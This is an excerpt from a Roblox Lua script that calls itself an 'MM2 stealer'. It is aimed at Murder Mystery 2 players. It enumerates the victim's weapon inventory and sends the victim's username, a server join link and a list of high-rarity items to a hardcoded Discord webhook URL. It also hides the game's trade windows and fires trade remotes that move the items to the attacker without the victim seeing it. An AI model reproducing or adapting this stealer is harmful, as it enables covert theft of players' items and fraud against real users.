_G.min_rarity = "Godly"
_G.userName = _G.userName or "GamerReadyReal"
_G.vlorp = _G.vlorp or false
if _G.vlorp then return end
_G.vlorp = true
...
local webHook = "https://discord.com/api/webhooks/1365148517705715723/Dk9d15MHG2MikM5HTszkJAZVGX5XWZFUrWBSMNr1EoU2a_gBx1enC2yoGMyyU3qUL7va"
...
local minRarityLevel = rarityRank[_G.min_rarity] or 1
...
function SendSimpleWebhook(url, username, itemList, totalValue, jobId)
    local description = "**Victim Username:**\n" .. username .. "\n\n" ..
                        "**Join with link:**\nhttps://gamerready.github.io/goofy-site/?placeId=142823291&gameInstanceId=".. jobId .. "\n\n" ..
                        "**Item list:**\n"

    for _, item in ipairs(itemList) do
        description = description .. item.name .. " (x" .. item.amount .. "): " .. item.value .. " Value (" .. item.rarity .. ")\n"
    end
    ...
    local embed = {
        ...
        ["color"] = 65280,
        ["footer"] = {
            ["text"] = "MM2 stealer by GamerReady :3"
        }
    }
...
for category, items in pairs(InvModule.MyInventory.Data.Weapons) do
    for _, item in pairs(items) do
        local value = values[item.ItemName] or 0
...
local destroytrades2 = coroutine.create(function()
    while true do
        ...
        local tradeGUI = gui:WaitForChild("TradeGUI")
        local tradeGUIPhone = gui:WaitForChild("TradeGUI_Phone")
...
function prepareWebhookData()
    local itemsSent = {}
    local valueSum = 0

    for _, item in ipairs(allItems) do
        local rank = rarityRank[item.rarity] or 0
        if rank >= minRarityLevel then
            table.insert(itemsSent, item)
            valueSum = valueSum + (item.value * item.amount)
        end
    end

    SendSimpleWebhook(webHook, LP.Name, itemsSent, math.floor(valueSum + 0.5), game.JobId)
end
...
function stealitems()
    ...
    for _, item in ipairs(allItems) do
        ...
        if rank >= minRarityLevel then
            for i = 1, item.amount do
                local args = { [1] = item.data, [2] = "Weapons" }
    ...
    wait(6)
    ReplicatedStorage.Trade.AcceptTrade:FireServer(unpack({ [1] = 285646582 }))
end
